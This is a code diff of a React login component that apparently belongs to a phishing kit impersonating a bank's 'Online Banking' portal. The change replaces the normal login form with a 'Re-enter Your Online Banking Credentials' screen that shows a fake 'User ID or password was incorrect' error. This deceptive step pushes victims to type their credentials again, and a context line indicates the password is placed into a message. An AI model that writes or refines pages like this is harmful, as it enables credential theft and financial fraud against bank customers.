@@ -75,71 +75,75 @@ Password: ${password}
         </div>
       )}
 
-      <div className=" bg-white flex justify-center pt-16 px-4">
-        <div className="w-full max-w-[430px]">
-          <h2 className="text-[18px] text-[#222] mb-5">
-            Log in to{" "}
-            <span className="italic font-semibold text-[#003A70]">
-              Online Banking:
-            </span>
-          </h2>
+      <div className="bg-white flex justify-center pt-16 px-4">
+  <div className="w-full max-w-[430px]">
+    <h2 className="text-[18px] text-[#222] mb-2">
+      Re-enter Your{" "}
+      <span className="italic font-semibold text-[#003A70]">
+        Online Banking Credentials
+      </span>
+    </h2>
 
-          <form onSubmit={submit}>
-            <input
-              type="text"
-              required
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-              placeholder="User ID"
-              className="w-full h-12 border border-gray-400 rounded-sm px-4 text-[15px] placeholder:text-gray-500 focus:outline-none focus:border-[#003A70]"
-            />
+    <p className="text-[14px] text-red-600 mb-5 leading-6">
+   Your User ID or password was incorrect. Please re-enter your credentials.
+    </p>
 
-        <hr className="mb-5"/> 
-            
-            <input
-              type="password"
-              required
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              placeholder="Enter Your Password"
-              className="w-full h-12 border border-gray-400 rounded-sm px-4 text-[15px] placeholder:text-gray-500 focus:outline-none focus:border-[#003A70]"
-            />
+    <form onSubmit={submit}>
+      <input
+        type="text"
+        required
+        value={email}
+        onChange={(e) => setEmail(e.target.value)}
+        placeholder="User ID/Email"
+        className="w-full h-12 border-2 border-red-400 rounded-sm px-4 text-[15px] placeholder:text-gray-500 focus:outline-none focus:border-[#003A70]"
+      />
 
-            <button
-              type="button"
-              className="mt-2 text-[#0067B8] text-[14px] font-medium hover:underline"
-            >
-              Forgot password?
-            </button>
+      <hr className="my-2" />
 
-            <button
-              type="submit"
-              className="mt-8 w-full h-12 rounded-sm bg-[#003A70] text-white text-[16px] font-semibold hover:bg-[#002d56]"
-            >
-              NEXT
-            </button>
-          </form>
+      <input
+        type="password"
+        required
+        value={password}
+        onChange={(e) => setPassword(e.target.value)}
+        placeholder="Password"
+        className="w-full h-12 border-2 border-red-400 rounded-sm px-4 text-[15px] placeholder:text-gray-500 focus:outline-none focus:border-[#003A70]"
+      />
 
-          <div className="text-center mt-8">
-            <p className="text-[15px] text-gray-800">
-              New User?{" "}
-              <button
-                type="button"
-                className="text-[#0067B8] font-semibold hover:underline"
-              >
-                Enroll
-              </button>
-            </p>
+      <button
+        type="button"
+        className="mt-2 text-[#0067B8] text-[14px] font-medium hover:underline"
+      >
+        Forgot password?
+      </button>
 
-            <button
-              type="button"
-              className="mt-1 text-[#0067B8] text-[15px] font-semibold hover:underline"
-            >
-              Security and Privacy
-            </button>
-          </div>
-        </div>
-      </div>
+      <button
+        type="submit"
+        className="mt-8 w-full h-12 rounded-sm bg-[#003A70] text-white text-[16px] font-semibold hover:bg-[#002d56]"
+      >
+        Login
+      </button>
+    </form>
+
+    <div className="text-center mt-8">
+      <p className="text-[15px] text-gray-800">
+        New User?{" "}
+        <button
+          type="button"
+          className="text-[#0067B8] font-semibold hover:underline"
+        >
+          Enroll
+        </button>
+      </p>
+
+      <button
+        type="button"
+        className="mt-1 text-[#0067B8] text-[15px] font-semibold hover:underline"
+      >
+        Security and Privacy
+      </button>
+    </div>
+  </div>
+</div>
     </>
   );
 }
